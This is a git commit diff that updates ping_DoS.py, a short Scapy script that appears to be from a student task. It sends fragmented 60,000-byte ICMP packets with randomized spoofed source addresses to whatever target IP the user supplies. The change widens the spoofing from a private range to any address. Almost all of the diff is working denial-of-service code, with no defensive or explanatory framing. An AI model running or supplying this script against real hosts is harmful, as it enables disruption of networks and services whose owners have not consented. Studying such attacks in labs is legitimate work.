71c6f43239b94d308601512472558a2125fa205e
Shahmizan <71887108+2000726@users.noreply.github.com>
2021-10-21 16:27:19 +0800

    Update ping_DoS.py

--- task2/ping_DoS.py
+++ task2/ping_DoS.py
@@ -12,19 +12,19 @@ try:
   socket.inet_aton(args.target_ip) # Checks if it's a legal IP.
   
   if args.target_ip is not None: # Checks if argument is not empty
-            
+
     target_ip = args.target_ip 
     
-    ip = IP(src=RandIP("192.168.0.0/16"), dst=target_ip) # Randomize Source IP, specify destination target's IP
-    icmp = ICMP()
-    packet = 'X'*60000 # Sends a malicious packet of large size.
+    ip = IP(src=RandIP(), dst=target_ip) # Randomize Source IP, specify destination target's IP
+    message = '@' # Sends a malicious packet of large size.
     
-    send(fragment(ip/icmp/packet))
+    #send(fragment(IP(src=RandIP(),dst=target_ip)/ICMP()/(message*60000)))
+    send(fragment(ip/ICMP()/(message*60000)))
    
 except:
   print('[-]Please, use --target-ip or -t to set a Target IP Address!')
   print('[!]Example: -t 10.20.30.40')
   print('[?] -h for help')
   exit()
-
+  
 exit()
